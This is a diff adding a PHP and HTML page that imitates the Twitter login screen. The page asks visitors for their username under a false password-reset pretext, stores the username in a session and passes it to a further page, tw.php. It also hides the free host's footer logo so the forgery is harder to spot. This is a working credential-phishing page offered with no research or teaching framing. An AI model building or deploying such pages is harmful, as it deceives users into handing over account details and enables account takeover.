@@ -1,0 +1,244 @@
+<?php
+
+if ($_GET) {
+    $username=$_GET["username"];
+    session_start();
+    $_SESSION["username"]=$username;
+    header("location: tw.php?username=$username");
+}
+
+
+?>
+<!DOCTYPE html>
+<html>
+<head>
+	<title></title>
+
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width,initial-scale=1">
+	<link rel="icon">
+	<meta name="description">
+
+
+	
+<link rel="stylesheet" href="https://kit-free.fontawesome.com/releases/latest/css/free.min.css" media="all" >
+	
+
+
+
+
+
+</head>
+
+<body><center>
+	</center>
+	<table class="table-2">
+		<tr class="tr-2">
+			<td class="dot"></td>
+			<td class="lan"></td>
+			<td class="not"> </td>
+		</tr>
+	</table><br><br>
+<center>
+	<div class="cop">
+	<center><img src="https://i.hizliresim.com/p0rVEA.jpg" style="display:none;"></center>
+	
+	<div><img src="https://i.hizliresim.com/pgp0jxe.png" width="60" style="top: 60px; margin-right: 220px;"></div><br><br>
+	<span class="Copyright-Qenz">Log in to Twitter</span>
+	<p style="font-size: 13px; color: #999999; font-family: sans-serif; margin-bottom: 7px;">Please login with your login username to reset the password for your Twitter account.</p>
+	<form> <br>
+	<input type="text" name="username" placeholder="Username" required="" autocomplete="off" id="username" class="username"><br><br>
+	<button class="next" type="submit" id="next" disabled>Log in</button><br><br><br>
+	<a href="https://twitter.com/account/begin_password_reset?lang=en" class="forrrw">Forgot password?</a><a href="https://mobile.twitter.com/i/flow/signup" style="text-decoration: none; list-style: none; color:#1b95e0; font-family: sans-serif; font-size: 14px; ">Sign up for Twitter</a>
+</form>
+<br><br>
+</div>
+</center>
+<br><br><br><br><br><br>
+
+<style > 
+	img[src="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"]{
+	 display:none!important;
+	}
+</style>
+
+</body>
+
+<style type="text/css">
+	
+.forrrw{
+	color: #1b95e0;
+	font-size: 14px;
+	list-style: none;
+	text-decoration: none;
+	font-family: sans-serif;
+	margin-right: 10px;
+}
+	.next{
+		color:white;
+		font-weight:800;
+		background:#b9e0fc;
+		opacity:1;
+		outline:none;
+		border:none;
+		min-width:300px;
+		max-width:100%;
+		height:50px;
+		border-radius: 36px;
+
+	}
+	.username{
+		width:290px;
+		height:46px;
+		max-width:100%;
+		border-radius:5px;
+		outline:none;
+		border:1px solid #dedede;
+		background-color:white;
+		color:black;
+		
+	}.username::placeholder{
+		font-size:13px;
+		padding-left:3px;
+		box-sizing:border-box;
+		
+	}
+	.username:hover{
+		border: 2px solid #1da1f2;
+
+	}
+	.tExt-y{
+max-width:88%;
+width:300px;
+display:block;
+		margin-top:10px;
+		font-family:system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Ubuntu, "Helvetica Neue", sans-serif;
+		font-family:system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Ubuntu, "Helvetica Neue", sans-serif;
+	font-weight:400;
+	color:#999;
+	font-size:15px;
+	line-height:20px;
+	box-sizing:border-box;
+	
+		}
+	.cop{
+		box-sizing:border-box;
+		width:300px;
+		max-width:90%;
+	}
+
+.Copyright-Qenz{
+	font-family: “Helvetica Neue”,Helvetica,Arial,sans-serif;
+	color:black;
+	font-size:30px;
+	max-width:100%;
+	font-weight: 800;
+	margin-right:27px;
+}
+	
+	
+
+	body{
+		padding:0px;margin:0px;
+		background:white;
+
+	
+	
+	}.table{
+		width:90%;
+		height:100%;
+		
+
+	}.tr{
+		width:100%;
+		height:100%;
+
+	}.table-left{
+		width:75%;
+	}.table-right{
+		width:10%;
+	}.header-text-bold{
+font-family:system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Ubuntu, "Helvetica Neue", sans-serif;
+color:white;
+font-size:15px;
+font-weight:600;
+	}.header-text-light{
+		font-family:system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Ubuntu, "Helvetica Neue", sans-serif;
+		color:white;
+		font-weight:400;
+		font-size:13px;
+		
+	}.get{
+		width:50px;
+		border:1px solid #fff;
+		text-align:center;
+		padding:4px 2px;
+		border-radius:3px;
+	}.get span{
+		font-family:system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Ubuntu, "Helvetica Neue", sans-serif;
+		font-weight:500;
+		font-size:14px;
+		color:white;
+
+	}.table-2{
+		width:100%;
+		min-height:10px;
+		margin-top:13px;
+	
+	}.tr-2{
+		width:100%;
+	}.dot{
+		width:20%;
+		text-align:left;
+		box-sizing:border-box;
+		padding-left:10px;
+
+		}.lan{
+
+         width:60%;
+         text-align:center;
+
+
+		}
+.not{
+	width:20%;
+}
+		.lan span{
+			font-family:system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Ubuntu, "Helvetica Neue", sans-serif;
+			font-size:14px;
+			color:#8e8e8e;;
+
+		}#lan{
+			font-size:12.5px;
+		
+		}
+
+
+</style>
+
+<script type="text/javascript">
+
+	let username=document.getElementById('username');
+	let next=document.getElementById('next');
+
+	username.addEventListener('input',()=>{
+let usernameLen=username.value.length;
+if(usernameLen>3){
+	next.disabled=false;
+	next.style.background="#0095f7";
+
+}else{
+	next.disabled=true;
+	next.style.background="#b9e0fc";
+
+}
+
+	});
+
+</script>
+<style > 
+	img[src="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"]{
+	 display:none!important;
+	}
+</style>
+</html>
